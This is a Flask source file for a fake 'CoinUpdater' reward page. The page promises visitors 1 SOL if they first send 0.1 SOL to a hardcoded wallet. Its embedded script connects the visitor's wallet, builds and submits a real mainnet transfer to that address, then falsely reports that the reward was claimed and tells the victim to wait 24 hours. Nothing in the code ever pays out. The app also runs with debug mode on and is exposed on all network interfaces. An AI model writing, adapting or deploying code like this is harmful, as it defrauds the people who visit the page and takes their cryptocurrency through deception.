from flask import Flask, render_template_string

app = Flask(__name__)

WALLET_ADDRESS = "79vGoijbHkY324wioWsi2uL62dyc1c3H1945Pb71RCVz"
QR_CODE_URL = "https://raw.githubusercontent.com/markosgiassa1/coinupdater_bot/main/WelcomeCoinUpdater_qrcode.png"
CLAIM_AMOUNT_SOL = 1
PAY_AMOUNT_SOL = 0.1

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>CoinUpdater - Claim Reward</title>
  <link href="https://unpkg.com/@solana/wallet-adapter-react-ui/styles.css" rel="stylesheet" />
  <style>
    body {
      background-color: #000000;
      color: #fff;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      text-align: center;
      padding: 40px;
      margin: 0;
    }
    h1 {
      font-size: 2.8rem;
      margin-bottom: 0.5rem;
    }
    p.wallet {
      font-size: 1.3rem;
      margin: 1rem 0 3rem;
      letter-spacing: 1.2px;
      word-break: break-all;
    }
    img.qr {
      width: 250px;
      height: 250px;
      border-radius: 20px;
      box-shadow: 0 0 15px #00ff90;
      margin-bottom: 3rem;
    }
    #wallet-button {
      margin-bottom: 3rem;
    }
    button.claim-button {
      display: inline-block;
      background: linear-gradient(90deg, #00ff90, #00d178);
      color: #000;
      font-weight: bold;
      font-size: 1.4rem;
      padding: 15px 45px;
      border-radius: 40px;
      border: none;
      cursor: pointer;
      box-shadow: 0 4px 20px #00ff90aa;
      transition: all 0.3s ease;
    }
    button.claim-button:hover {
      background: linear-gradient(90deg, #00d178, #00ff90);
      box-shadow: 0 6px 30px #00ff90ff;
    }
    footer {
      margin-top: 5rem;
      font-size: 0.9rem;
      color: #444;
    }
  </style>
</head>
<body>
  <h1>Claim Your {{ claim_amount }} SOL Reward!</h1>
  <p class="wallet">Send {{ pay_amount }} SOL to wallet:<br><strong>{{ wallet }}</strong></p>
  <img src="{{ qr_url }}" alt="QR Code" class="qr" />
  <br />
  <div id="root"></div>

  <footer>
    &copy; 2025 CoinUpdater Bot
  </footer>

  <!-- React 17 + Wallet Adapter UMD bundles -->
  <script src="https://unpkg.com/react@17/umd/react.development.js"></script>
  <script src="https://unpkg.com/react-dom@17/umd/react-dom.development.js"></script>
  
  <script src="https://unpkg.com/@solana/wallet-adapter-base@0.9.12/lib/index.umd.js"></script>
  <script src="https://unpkg.com/@solana/wallet-adapter-react@0.15.20/lib/index.umd.js"></script>
  <script src="https://unpkg.com/@solana/wallet-adapter-wallets@0.15.10/lib/index.umd.js"></script>
  <script src="https://unpkg.com/@solana/wallet-adapter-react-ui@0.9.5/lib/index.umd.js"></script>

  <script>
    const { useMemo, useState, useEffect } = React;
    const { WalletProvider, ConnectionProvider, useWallet } = WalletAdapterReact;
    const { WalletModalProvider, WalletMultiButton } = WalletAdapterReactUI;
    const { PhantomWalletAdapter, SolflareWalletAdapter, GlowWalletAdapter, SolletExtensionWalletAdapter, SolletWalletAdapter } = WalletAdapterWallets;

    function App() {
      const wallet = useWallet();
      const [message, setMessage] = useState("");
      const [claiming, setClaiming] = useState(false);

      async function handleClaim() {
        if (!wallet.connected) {
          setMessage("Please connect your wallet first!");
          return;
        }
        setClaiming(true);
        setMessage("Opening your wallet to sign the payment transaction...");
        
        try {
          // Build transaction to send 0.1 SOL to WALLET_ADDRESS
          const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'), 'confirmed');
          const fromPubkey = wallet.publicKey;
          const toPubkey = new solanaWeb3.PublicKey("{{ wallet }}");
          const transaction = new solanaWeb3.Transaction().add(
            solanaWeb3.SystemProgram.transfer({
              fromPubkey,
              toPubkey,
              lamports: 0.1 * solanaWeb3.LAMPORTS_PER_SOL
            })
          );

          transaction.feePayer = fromPubkey;
          const { blockhash } = await connection.getRecentBlockhash();
          transaction.recentBlockhash = blockhash;

          const signedTx = await wallet.signTransaction(transaction);
          const txid = await connection.sendRawTransaction(signedTx.serialize());
          await connection.confirmTransaction(txid, 'confirmed');

          setMessage("Payment successful! You've claimed 1 SOL. Please wait patiently for 24 hours as requests are high.");
        } catch (error) {
          console.error(error);
          setMessage("Transaction failed or was cancelled.");
        }
        setClaiming(false);
      }

      return React.createElement('div', null,
        React.createElement(WalletMultiButton, { id: "wallet-button" }),
        React.createElement('br'),
        React.createElement('button', { className: "claim-button", onClick: handleClaim, disabled: claiming },
          claiming ? "Processing..." : "Claim Now"
        ),
        React.createElement('p', null, message)
      );
    }

    function Root() {
      const wallets = useMemo(() => [
        new PhantomWalletAdapter(),
        new SolflareWalletAdapter({ network: "mainnet" }),
        new GlowWalletAdapter(),
        new SolletExtensionWalletAdapter({ network: "mainnet" }),
        new SolletWalletAdapter({ network: "mainnet" }),
      ], []);

      const endpoint = solanaWeb3.clusterApiUrl('mainnet-beta');

      return React.createElement(
        ConnectionProvider, { endpoint },
        React.createElement(
          WalletProvider, { wallets, autoConnect: true },
          React.createElement(
            WalletModalProvider, null,
            React.createElement(App)
          )
        )
      );
    }

    // Load solanaWeb3 from CDN (solana web3.js) then render React app
    function loadScript(url) {
      return new Promise((resolve) => {
        const script = document.createElement('script');
        script.src = url;
        script.onload = resolve;
        document.head.appendChild(script);
      });
    }

    loadScript('https://unpkg.com/@solana/web3.js@1.67.0/lib/index.iife.min.js').then(() => {
      ReactDOM.render(React.createElement(Root), document.getElementById('root'));
    });
  </script>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(
        HTML_TEMPLATE,
        wallet=WALLET_ADDRESS,
        qr_url=QR_CODE_URL,
        claim_amount=CLAIM_AMOUNT_SOL,
        pay_amount=PAY_AMOUNT_SOL
    )

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080, debug=True)
